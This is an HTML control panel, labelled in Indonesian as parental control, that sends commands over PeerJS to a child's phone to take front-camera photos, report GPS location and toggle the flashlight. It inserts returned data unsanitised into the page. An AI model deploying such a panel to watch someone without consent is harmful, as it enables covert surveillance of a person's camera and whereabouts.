<!DOCTYPE html>
<html>
<head><title>Parental Control</title></head>
<body style="background:#1a1a1a; color:white; text-align:center; font-family:sans-serif;">
    <h2>ğŸ® Dashboard Pantau</h2>
    <div id="status">Mencari HP Anak...</div>
    <hr>
    <button onclick="kirim('CEK_FOTO')">ğŸ“¸ AMBIL FOTO DEPAN</button><br>
    <button onclick="kirim('CEK_LOKASI')">ğŸ“ CEK LOKASI GPS</button><br>
    <button onclick="kirim('SENTER_ON')">ğŸ”¦ NYALA SENTER</button>
    <button onclick="kirim('SENTER_OFF')">âŒ MATI SENTER</button>
    <hr>
    <div id="hasil"></div>

    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <script>
        const peer = new Peer();
        let conn;
        peer.on('open', () => {
            conn = peer.connect("hayabusa_monitor_anak");
            conn.on('open', () => { document.getElementById('status').innerText = "TERHUBUNG âœ…"; });
            conn.on('data', (data) => {
                if(data.type === "FOTO") {
                    document.getElementById('hasil').innerHTML = `<h3>Foto Terbaru:</h3><img src="${data.data}" width="300">`;
                }
                if(data.type === "LOKASI") {
                    document.getElementById('hasil').innerHTML = `<h3>Lokasi:</h3><a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank">Lihat di Peta</a>`;
                }
            });
        });

        function kirim(cmd) { if(conn) conn.send(cmd); }
    </script>
</body>
</html>
